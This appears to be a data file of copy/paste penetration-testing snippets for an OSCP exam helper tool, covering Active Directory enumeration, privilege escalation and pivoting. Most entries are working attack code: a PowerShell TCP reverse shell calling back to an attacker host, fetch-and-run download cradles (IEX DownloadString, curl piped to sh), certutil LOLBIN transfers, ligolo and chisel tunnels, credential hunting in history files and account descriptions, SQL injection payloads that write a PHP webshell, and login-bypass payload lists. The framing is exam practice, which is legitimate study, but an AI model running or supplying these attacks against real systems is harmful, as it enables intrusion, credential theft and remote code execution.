_note: Copy/paste manual-exploitation snippet library (ROADMAP §11). Project-authored obol-local data. Fact kinds are normalized to obol-local's namespace (AGENTS.md); {{tokens}} are filled from facts by obol/scripts.py (basedn/target/user/password/domain from command_context, lhost/lport from staging/listeners). examSafe = OSCP-rule-safe (manual, no automated exploitation). Nothing here is auto-executed — every snippet is human-run.

scripts.cat: AD Enum — no PowerView, no upload
scripts.name: LDAPSearch (.NET DirectoryServices helper)
scripts.desc: Queries Active Directory through pure .NET DirectoryServices — nothing to upload, no PowerView, and it runs from any domain-joined shell.
scripts.when: You hold any Windows foothold (RDP, WinRM, reverse shell) on a domain-joined host and want AD answers without dropping tooling that AV already fingerprints.
scripts.where: Run on the TARGET (domain-joined Windows) in any PowerShell session. Paste the function first, then the cookbook queries.
scripts.how: Paste the whole function into your session, then call: LDAPSearch -LDAPQuery "(filter)". Results come back as DirectoryEntry objects — pipe to ForEach-Object { $_.Properties } to read attributes.
scripts.code:
function LDAPSearch {
    param([string]$LDAPQuery)
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $rootDN = ([adsi]"LDAP://$dc").distinguishedName
    $root = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$rootDN")
    $finder = New-Object System.DirectoryServices.DirectorySearcher($root)
    $finder.PageSize = 1000          # page results so you are not capped at the first 1000
    $finder.Filter = $LDAPQuery
    $finder.FindAll()
}
scripts.examSafeReason: Pure .NET DirectoryServices querying — no collector uploaded and no automated exploitation, so it stands in for BloodHound/NetExec collection under exam rules.

expects: Directory entries (distinguishedName / sAMAccountName / CN= user objects) confirm the enumeration returned data.
A DC=…,DC=… distinguished name reveals the domain base DN.
An error (server not operational, invalid credentials, access denied) records nothing.

scripts.cat: AD Enum — no PowerView, no upload
scripts.name: LDAPSearch query cookbook
scripts.desc: Runs after the LDAPSearch function. Each line answers a question BloodHound would otherwise map — group membership, roastable accounts, nested membership.
scripts.when: Once the LDAPSearch function is loaded. Reach for these instead of a BloodHound collector whenever you cannot (or choose not to) run one.
scripts.where: The same session where you pasted LDAPSearch.
scripts.how: Swap the DN placeholders for real values from earlier queries. Grab the domain DN first with ([adsi]'').distinguishedName, then build DNs like CN=Some User,CN=Users,<that DN>.
scripts.code:
# Enumerate every user object:
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
# Enumerate group objects:
LDAPSearch -LDAPQuery "(objectclass=group)"
# Direct members of one group (swap in the group's real DN):
LDAPSearch -LDAPQuery "(memberOf=CN=<GROUP NAME>,CN=Users,{{basedn}})"
# A user's full group chain, nested included (OID 1.2.840.113556.1.4.1941 walks the tree):
LDAPSearch -LDAPQuery "(member:1.2.840.113556.1.4.1941:=CN=<USER NAME>,CN=Users,{{basedn}})"
# Accounts with an SPN and not disabled (kerberoast set):
LDAPSearch -LDAPQuery "(&(samAccountType=805306368)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
# Accounts flagged DONT_REQ_PREAUTH / 4194304 (AS-REP roast set):
LDAPSearch -LDAPQuery "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
# Dump each account's description field — credentials are often parked there:
LDAPSearch -LDAPQuery "(samAccountType=805306368)" | ForEach-Object { "{0} :: {1}" -f $_.Properties['samaccountname'], $_.Properties['description'] }
scripts.examSafeReason: Hand-run LDAP queries answer the questions BloodHound would graph without running a collector.

expects: sAMAccountName / description rows returned by the cookbook queries confirm enumeration.
A DC=…,DC=… distinguished name reveals the domain base DN.
An empty or errored query records nothing.

scripts.cat: AD Enum — no PowerView, no upload
scripts.name: PowerView quick hits (when you CAN upload)
scripts.desc: The PowerView one-liners that stand in for whole BloodHound edges.
scripts.when: You hold a Windows foothold with PowerView.ps1 staged (see the download cradles). Quicker than LDAPSearch for ACL questions.
scripts.where: A target PowerShell session, after IEX-loading PowerView.
scripts.how: First IEX-load it: IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/PowerView.ps1'), then fire the queries below.
scripts.code:
# Where does your token already have local admin (highest-value single query):
Find-LocalAdminAccess
# Who is logged on to a reachable host (pick targets for credential theft):
Get-NetSession -ComputerName {{target}}
# Interesting rights your principal holds over other objects:
Get-ObjectAcl -Identity {{user}} -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner|ForceChangePassword' }
# SPN-bearing accounts (kerberoast candidates):
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
# Pre-auth-not-required accounts (AS-REP candidates):
Get-NetUser -PreauthNotRequired | Select-Object samaccountname
scripts.examSafeReason: PowerView is manual AD enumeration (permitted), not automated exploitation; it replaces BloodHound edges query by query.

scripts.name: PowerShell reverse shell (compact one-liner)
scripts.desc: A minimal TCP reverse shell that needs no external script download.
scripts.when: You already have command execution on Windows (webshell, SQLi→cmd, xp_cmdshell) and want a full interactive session back.
scripts.where: Paste/run ON the target. Start the catcher on Kali FIRST: nc -lvnp {{lport}} — always bring the listener up before firing the shell.
scripts.how: The sidebar fills {{lhost}}/{{lport}}. If a raw paste breaks, wrap it with the UTF-16LE base64 helper below.
scripts.code: $cli=New-Object Net.Sockets.TcpClient('{{lhost}}',{{lport}});$st=$cli.GetStream();$buf=New-Object byte[] 65536;while(($n=$st.Read($buf,0,$buf.Length)) -gt 0){$cmd=[Text.Encoding]::ASCII.GetString($buf,0,$n);$out=try{Invoke-Expression $cmd 2>&1|Out-String}catch{"$_"};$out+="PS $((Get-Location).Path)> ";$resp=[Text.Encoding]::ASCII.GetBytes($out);$st.Write($resp,0,$resp.Length);$st.Flush()};$cli.Close()
scripts.examSafeReason: A hand-built TCP reverse shell — no framework payload or automated handler.

scripts.name: Download cradles (get tools onto target)
scripts.desc: In-memory when AV watches the disk; on-disk when the file must survive. certutil is the LOLBIN fallback.
scripts.when: You have execution on Windows and need to deliver a tool (PowerView, winPEAS, nc.exe, SharpHound).
scripts.where: Run on the TARGET. Your Kali box must already be serving the file (see the last line).
scripts.how: In-memory means no disk write and it dies with the session; on-disk survives but AV may eat it — C:\Users\Public is usually writable.
scripts.code:
# Fileless fetch-and-run (best for PowerView and other .ps1 tooling):
(New-Object Net.WebClient).DownloadString('http://{{lhost}}/PowerView.ps1') | Invoke-Expression
# Save to disk, then execute:
Invoke-WebRequest http://{{lhost}}/winPEASany.exe -OutFile C:\Users\Public\w.exe
# When the cmdlets are blocked, fall back to a signed LOLBIN:
certutil -urlcache -split -f http://{{lhost}}/w.exe C:\Users\Public\w.exe
# Serve the files from your box first: python3 -m http.server 80  (SMB: impacket-smbserver share . -smb2support)
scripts.examSafeReason: Built-in download cradles and the certutil LOLBIN — nothing automated, nothing framework-generated.

scripts.name: TTY upgrade (make a dumb shell interactive)
scripts.desc: Arrows, tab-completion, Ctrl+C, su — the first thing to do the moment you land any Linux shell.
scripts.when: Right after catching a Linux reverse/bind shell, before you do anything else.
scripts.where: The first line goes in the DUMB SHELL on the target; the stty line goes in YOUR Kali terminal after backgrounding.
scripts.how: python3 line → Ctrl+Z → stty raw -echo; fg → (blind) export TERM=xterm + Enter. If python3 is missing, try python, script -qc /bin/bash /dev/null, or socat.
scripts.code:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# background it with Ctrl+Z, then on your own terminal hand the tty raw:
stty raw -echo; fg
# once the shell is back: export TERM=xterm   (reset -w if the size is wrong)
# no python? try:  script -qc /bin/bash /dev/null
scripts.examSafeReason: Interpreter built-ins only; a manual shell upgrade with no tooling.

scripts.name: OSCP proof snapshot (the exact OffSec frame)
scripts.desc: A single screenshot capturing the proof-file contents AND the target IP together in one frame.
scripts.when: The instant you read a local.txt or proof.txt on an exam/lab box, ahead of anything else.
scripts.where: From your shell ON the target.
scripts.how: Screenshot the whole terminal showing every line. Paste the flag into the exam control panel too. Miss this and the box scores zero.
scripts.code:
# Windows — flag plus identity/interface in one shot:
type C:\Users\Administrator\Desktop\proof.txt & ipconfig /all
# Linux equivalent:
cat /root/proof.txt; ip addr
# When it is the low-priv local flag instead:
type C:\Users\*\Desktop\local.txt & ipconfig
cat /home/*/local.txt; ip addr
scripts.examSafeReason: Native commands to capture the proof frame; nothing to install.

scripts.name: ligolo-ng quick setup (route-backed pivot)
scripts.desc: A modern pivot: a real tun interface, so nmap/smbclient/everything routes through the compromised host.
scripts.when: You have a shell on a dual-homed host and need to reach the internal subnet with arbitrary tools, not just SOCKS-aware ones.
scripts.where: Proxy and server side live on KALI; the agent runs on the TARGET.
scripts.how: Create the tun interface once, run proxy on Kali and agent on target, then `session` → `start` in the proxy console, add the route, and your tools just work on internal IPs.
scripts.code:
# On your box, one-time per session — stand up the tun interface:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# On the target after uploading the agent binary:
./agent -connect {{lhost}}:11601 -ignore-cert
# In the proxy console — attach and go:
session            # select the connected agent
start
# Back on your box (new terminal) — add a route to the subnet you saw on the target:
sudo ip route add 10.10.10.0/24 dev ligolo
scripts.examSafeReason: Manual tunnelling the operator drives step by step — permitted pivoting, no automated exploitation.

scripts.name: chisel quick setup (SOCKS + port forwards)
scripts.desc: A single-binary HTTP tunnel — reverse SOCKS when you cannot bind, forward when you can.
scripts.when: ligolo is overkill or blocked and you need SOCKS5 through the target, or to expose one internal port.
scripts.where: The server runs on KALI and the client on the TARGET. Stage the matching-arch chisel binary first.
scripts.how: Reverse SOCKS = target dials out to you and your tools use socks5://127.0.0.1:1080 via proxychains. Add "socks5 127.0.0.1 1080" to /etc/proxychains4.conf.
scripts.code:
# On your box — reverse listener:
./chisel server -p 9000 --reverse
# On the target — reverse SOCKS proxy (pivot into the internal network):
./chisel client {{lhost}}:9000 R:socks
# On the target — forward a single internal service to a local port (e.g. 10.10.10.20:80):
./chisel client {{lhost}}:9000 R:8080:10.10.10.20:80
# Drive it:  proxychains nxc smb 10.10.10.20 ...   or open http://127.0.0.1:8080
scripts.examSafeReason: Manual SOCKS/port-forward tunnelling the operator drives; permitted pivoting.

scripts.name: PSCredential helper — run as another user
scripts.desc: Builds a credential object and runs commands remotely as that user (the writedacl-dcsync card uses this for Add-ObjectACL).
scripts.when: You recovered a cleartext password for another account and want to operate as them from your current Windows session.
scripts.where: From your current PowerShell session on a domain-joined host.
scripts.how: The sidebar supplies {{user}}/{{password}}/{{domain}}. The one-liner form also runs from cmd.exe (handy for webshells).
scripts.code:
$sec = ConvertTo-SecureString '{{password}}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{{domain}}\{{user}}', $sec)
Invoke-Command -ComputerName {{target}} -Credential $cred -ScriptBlock { hostname; whoami }
# Collapsed to one line (usable straight from cmd.exe or a webshell):
powershell -Command "$s=ConvertTo-SecureString '{{password}}' -AsPlainText -Force; $c=New-Object System.Management.Automation.PSCredential('{{domain}}\{{user}}',$s); Invoke-Command -ComputerName {{target}} -Credential $c -ScriptBlock { hostname; whoami }"
scripts.examSafeReason: Native PowerShell credential object — no tooling, no automated exploitation.

scripts.name: Base64 for powershell -e (must be UTF-16LE)
scripts.desc: powershell -e decodes UTF-16LE base64 only; a plain base64 blob just fails silently.
scripts.when: A payload with quotes or special characters keeps breaking when pasted (webshells, xp_cmdshell).
scripts.where: Do the encoding on KALI, then paste the result on the TARGET.
scripts.how: Save your script as rev.ps1, run the encoder, then paste the blob after -e. -nop -w hidden keeps it quiet.
scripts.code:
# Encode a PowerShell script the way -EncodedCommand expects it (UTF-16LE then base64):
iconv -t UTF-16LE rev.ps1 | base64 -w 0
# then paste the blob on the target:
powershell -nop -w hidden -e <blob>
scripts.examSafeReason: Local encoding helper on Kali; touches no target.

scripts.name: PowerShell port sweep (no nmap on target)
scripts.desc: For a Windows box with no tooling that needs to probe a host.
scripts.when: Pivot recon: you landed on a Windows host and need to map what it can reach internally.
scripts.where: On the target, in any PowerShell session.
scripts.how: Adjust the 1..1024 range and {{target}}. Slow but zero-upload. For a subnet sweep, wrap it in an outer loop over the last octet.
scripts.examSafeReason: Native Test-NetConnection sweep — no scanner uploaded to the target.

expects: Only "<port> open" result lines record an internal-reach observation.
A run with no open-port lines records nothing.

scripts.name: Verify uploads (corrupted transfers waste hours)
scripts.desc: Hash the file on both ends after any transfer and compare.
scripts.when: A tool crashes instantly or behaves oddly after upload — suspect a truncated transfer before anything else.
scripts.where: First line on the TARGET, second on KALI, then compare the outputs.
scripts.how: MD5 is fine for integrity (not security). If they differ, re-upload with a different method (smbserver instead of http, or a base64 paste).
scripts.code:
Get-FileHash C:\Users\Public\w.exe -Algorithm MD5 | Select-Object -ExpandProperty Hash
# compare against your box:  md5sum w.exe
scripts.examSafeReason: Built-in hashing to verify a transfer; nothing installed.

scripts.name: Windows privesc quick loop (before/while winPEAS runs)
scripts.desc: A fast manual pass — privileges, patches, saved creds, password-history files.
scripts.when: On every Windows foothold, right away — 60 seconds of work that turns up a third of privescs.
scripts.where: On the target.
scripts.how: whoami /priv — SeImpersonate points to the potato family; the history file leaks typed passwords; cmdkey — saved creds feed runas /savecred; systeminfo — an old OS opens kernel exploits via wesng.
scripts.code:
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Get-Content (Get-PSReadlineOption).HistorySavePath   # console history often holds secrets
cmdkey /list                                         # saved credentials
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr InstallLocation
scripts.examSafeReason: Native Windows commands for a manual privesc pass; no automated exploitation.

scripts.name: Linux privesc quick loop (before/while linpeas runs)
scripts.desc: A 60-second manual pass: sudo rights, SUID binaries, capabilities, cron, writable configs.
scripts.when: On every Linux foothold, right away — the same discipline as the Windows loop.
scripts.where: Straight on the target.
scripts.how: sudo -l — anything listed maps to GTFOBins; the SUID find cross-checks against GTFOBins; getcap — cap_setuid/python is instant root; crontab — a root-run script you can write is root.
scripts.code:
sudo -l                                   # sudo rights (GTFOBins fodder)
find / -perm -4000 -type f 2>/dev/null    # SUID binaries
getcap -r / 2>/dev/null                   # file capabilities
cat /etc/crontab; ls -la /etc/cron.*      # scheduled jobs
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|home/'"$(whoami)"')' | head -30
scripts.examSafeReason: Native Linux commands for a manual privesc pass; no automated exploitation.

scripts.name: Fetch and run linpeas/winPEAS
scripts.desc: The automated sweep to run after the manual loop. Expect huge output — grep for the red flags.
scripts.when: Once the quick loop is done, on any foothold where you can move files across.
scripts.where: Serve from KALI with python3 -m http.server 80; download and run on the TARGET.
scripts.how: Kali ships them at /usr/share/peas/linpeas/linpeas.sh and winpeas. Read the red/yellow highlights first — 95% of findings are there.
scripts.code:
# Serve the scripts from your box:  cd /usr/share/peas && python3 -m http.server 80
# Linux target — stream linpeas straight into a shell:
curl -s http://{{lhost}}/linpeas/linpeas.sh | sh
# Windows target — pull winPEAS, then run C:\Users\Public\w.exe:
Invoke-WebRequest http://{{lhost}}/winpeas/winPEASany.exe -OutFile C:\Users\Public\w.exe
scripts.examSafeReason: PEAS is an enumeration script the operator reads (permitted); it runs no exploits.

scripts.name: OSCP submission packaging (exact OffSec format)
scripts.desc: Builds the precise archive the upload portal expects — a wrong filename or format means an unscored report.
scripts.when: Once the report PDF is final, before the 24-hour upload window closes.
scripts.where: Run on KALI in the folder holding your PDF.
scripts.how: Swap OS-XXXXX for your OSID (case-sensitive), leave the 7z unencrypted, and check the MD5 the portal shows against your local md5sum.
scripts.code:
# The report is a PDF and the filename must match exactly (replace the OSID):
mv report.pdf OSCP-OS-XXXXX-Exam-Report.pdf
# Wrap it in an un-encrypted archive, kept under the size limit:
7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf
# Checksum it and confirm the value matches the one shown after upload:
md5sum OSCP-OS-XXXXX-Exam-Report.7z
scripts.examSafeReason: Local report packaging on Kali; touches no target.

scripts.name: Manual SQLi — detect, navigate the DB, extract, RCE (no sqlmap)
scripts.desc: Hand-driven SQLi against a reflected query parameter (e.g. page.php?id=1): detect the flaw, fingerprint the engine, walk the database (databases → tables → columns → rows), extract creds, and — only where privileges allow — escalate to RCE. Pick your DB engine in the builder to get the right dialect. The exam-safe path when sqlmap is off-limits.
scripts.when: A URL/query parameter reflects into a SQL query and the rules forbid sqlmap. Attacking a login FORM instead? Use the "SQLi login / auth bypass" checklist below — this one is for enumerating and looting a database through an injectable parameter.
scripts.where: From KALI against the web target (curl, or replayed in Burp). Nothing touches the target until the RCE stage, which you trigger by hand.
scripts.how: Set the engine, endpoint path, and parameter in the builder, then toggle the stages you need. Work top to bottom: confirm the injection (a quote that breaks the page, or a true-vs-false page difference), get the column count with ORDER BY, then UNION to fingerprint and walk information_schema. Extract, then attempt RCE only where the engine and privileges allow. Capture the request and response for every finding.
scripts.code:
# Payloads below assume MySQL/MariaDB — pick a different engine in the builder for MSSQL/PostgreSQL.
# --- STEP 0 - Is it injectable? (break the quote, then confirm true vs false) ---
curl -s "http://{{target}}/page.php?id=1'"                 # error / 500 / altered page => worth pursuing
curl -s "http://{{target}}/page.php?id=1 AND 1=1 -- -"     # true  => page looks normal
curl -s "http://{{target}}/page.php?id=1 AND 1=2 -- -"     # false => page changes or empties

# --- STEP 1 - Count the columns (increment ORDER BY until it errors) ---
curl -s "http://{{target}}/page.php?id=1 ORDER BY 1 -- -"  # raise 2,3,...; last value that works is the count

# --- STEP 2 - Land a UNION and fingerprint (N = column count) ---
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,2,3 -- -"                 # note which columns render
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,@@version,database() -- -" # server version + active DB
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,current_user(),3 -- -"     # who the query runs as

# --- STEP 3 - Walk the structure (schemas -> tables -> columns) ---
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata -- -"
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -"
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -"

# --- STEP 4 - Pull the rows you care about ---
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -"

# --- STEP 5 - UNION not available? error / blind fallbacks ---
curl -s "http://{{target}}/page.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -"        # error-based: value leaks in the error text
curl -s "http://{{target}}/page.php?id=1 AND substring((SELECT database()),1,1)='a' -- -"                 # boolean-blind: one character at a time
curl -s "http://{{target}}/page.php?id=1 AND IF(substring((SELECT database()),1,1)='a',sleep(3),0) -- -"  # time-blind: a 3s delay means true

# --- STEP 6 - Code exec (only with FILE priv + a known webroot) ---
curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php' -- -"  # write a webshell
curl -s "http://{{target}}/s.php?0=id"                     # execute through it

# Capture per step: the exact request, the true/false difference, the rows returned,
# and for code-exec the command output echoed back.
scripts.examSafeReason: Every request is issued by hand (curl / browser / Burp), so it performs no automated exploitation — the OSCP-permitted alternative to sqlmap.

expects: A true-vs-false page difference or a SQL error (syntax / extractvalue / conversion) confirms the injection is live — not just that a request was sent.
group_concat rows in the form user:hash (or an information_schema dump with real data) confirm credential extraction.
A command result echoed in the response from the written webshell (uid=…, a whoami line, hostname) confirms RCE — the INTO OUTFILE / xp_cmdshell request alone does not.

scripts.name: SQLi login / auth bypass checklist (fuzz a login form)
scripts.desc: A ready-to-fuzz set of authentication-bypass payloads for a username/password login form — get in without valid credentials wherever the login query is not parameterized. The everyday "there is a login page" case, laid out as a checklist you paste through the browser, Burp, or curl.
scripts.when: A web app presents a username/password login and you suspect the fields drop straight into a SQL query (a single quote in the username throws an error or a 500, or it is a lab/exam web box). Going after a reflected URL parameter instead? Use the "Manual SQLi" tool above.
scripts.where: From KALI — type payloads into the form in the browser, replay the login POST through Burp Repeater/Intruder, or fire it with curl. Nothing executes on the target; you are only submitting form values.
scripts.how: Drop a payload in the USERNAME field, put anything in the password, and submit. Success shows up as a redirect to a dashboard, a Set-Cookie session, an authenticated page, or a response length clearly off the "invalid credentials" baseline. If one comment style does nothing, move to the next (-- - then # then /* */). Burp Intruder can spray the whole list at once so you can sort by status/length.
scripts.code:
# Drop a payload in the USERNAME field (any password). A win looks like a redirect, a
# Set-Cookie session, an authenticated page, or a body length that differs from the
# "invalid credentials" baseline.

# --- Authenticate as the FIRST row (commonly admin) ---
admin' -- -
admin' #
administrator' -- -
' OR 1=1 -- -
' OR 1=1 LIMIT 1 -- -

# --- Force a true condition (when no real username is matched) ---
' OR '1'='1' -- -
' OR '1'='1
" OR "1"="1" -- -
') OR ('1'='1' -- -
admin') -- -

# --- Reproduce the login POST with curl (fix the field names + path) ---
curl -s -i -X POST "http://{{target}}/login.php" \
  --data-urlencode "username=admin' -- -" \
  --data-urlencode "password=x"

# --- Fuzz the whole list in Burp Intruder ---
# Send the login request to Intruder, mark only the username value as the payload slot,
# load these as a Simple list, and sort the results by status / length to find the hit.

# Likely not injectable if every payload yields the same "invalid credentials" length -
# switch to the password field, a different comment marker, or a parameter-based SQLi.
scripts.examSafeReason: Payloads are submitted by hand through the browser, Burp, or curl — manual testing with no automated exploitation tool.

scripts.name: Bash /dev/tcp port + host sweep (no nmap on target)
scripts.desc: A pure-bash TCP connect scan using the /dev/tcp builtin — probe internal hosts/ports from a Linux foothold with nothing to upload.
scripts.when: You are on a Linux host with no nmap/nc and need to map what it can reach internally (pivot recon).
scripts.where: On the target, in bash. Nothing is written to disk.
scripts.how: Tune the host and port list. Because /dev/tcp is a bash builtin, it works even when no scanner is present. For a subnet, loop the last octet as in the third line.
scripts.code:
# One host, the usual suspects:
t={{target}}; for p in 21 22 23 25 53 80 110 139 143 443 445 3306 3389 5985 8080; do timeout 1 bash -c "echo >/dev/tcp/$t/$p" 2>/dev/null && echo "$t:$p open"; done
# One host, full low range (slower):
t={{target}}; for p in $(seq 1 1024); do timeout 1 bash -c "echo >/dev/tcp/$t/$p" 2>/dev/null && echo "$p open"; done
# Sweep a /24 for one open port (discover live internal hosts):
for i in $(seq 1 254); do timeout 1 bash -c "echo >/dev/tcp/10.10.10.$i/445" 2>/dev/null && echo "10.10.10.$i 445 open"; done
scripts.examSafeReason: Uses only the bash /dev/tcp builtin — no scanner uploaded or installed, and no automated exploitation.

expects: Only lines that report an open service (host:port open / "<port> open") record an internal-reach observation.
An empty run, or connection-refused/unreachable output, records nothing — a completed sweep is not a discovery.

scripts.name: LOLBIN file transfer (curl / wget / built-ins)
scripts.desc: Move a tool onto the target using only what is already installed — curl, wget, bash /dev/tcp, PowerShell, or certutil — with no dedicated transfer tool.
scripts.when: You have execution but need to pull down a binary/script without uploading a transfer tool that AV already flags.
scripts.where: Serve from KALI (first line) and pull on the TARGET (the rest). Use whichever client's interpreter is present.
scripts.how: Start the HTTP server on Kali, then run the matching client line on the target. certutil and PowerShell are the Windows LOLBIN fallbacks; curl/wget/bash /dev/tcp cover Linux.
scripts.code:
# Serve the file from your box (current directory):
python3 -m http.server 80
# Linux target - curl or wget:
curl -s http://{{lhost}}/tool -o /tmp/tool && chmod +x /tmp/tool
wget -q http://{{lhost}}/tool -O /tmp/tool
# Linux with neither installed - raw bash /dev/tcp:
exec 3<>/dev/tcp/{{lhost}}/80; printf 'GET /tool HTTP/1.0\r\n\r\n' >&3; cat <&3 > /tmp/tool
# Windows target - PowerShell or a signed LOLBIN:
powershell -c "Invoke-WebRequest http://{{lhost}}/tool.exe -OutFile C:\Users\Public\t.exe"
certutil -urlcache -split -f http://{{lhost}}/tool.exe C:\Users\Public\t.exe
scripts.examSafeReason: Relies only on binaries already present on the host (living off the land); no transfer tooling is uploaded.
